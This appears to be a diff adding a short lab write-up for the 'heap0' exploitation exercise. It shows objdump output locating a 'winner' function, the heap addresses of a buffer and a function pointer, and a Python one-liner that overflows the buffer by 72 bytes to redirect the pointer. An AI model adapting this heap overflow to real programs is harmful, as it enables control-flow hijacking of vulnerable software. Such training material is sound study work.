@@ -1,0 +1,15 @@
+- find address of winner function
+$ objdump --syms ./heap0 | grep winner
+08048464 g     F .text	00000014              winner
+
+- data and f are adjacent in the heap
+$ ./heap0 aaa
+data is at 0x804a008, fp is at 0x804a050
+
+The difference is 72 bytes (0x50 - 0x08). We fill this, and after we modify the fp member
+to point to the winner function:
+
+$ ./heap0 `python -c 'print "A"*72 + "\x64\x84\x04\x08"'`
+data is at 0x804a008, fp is at 0x804a050
+level passed
+
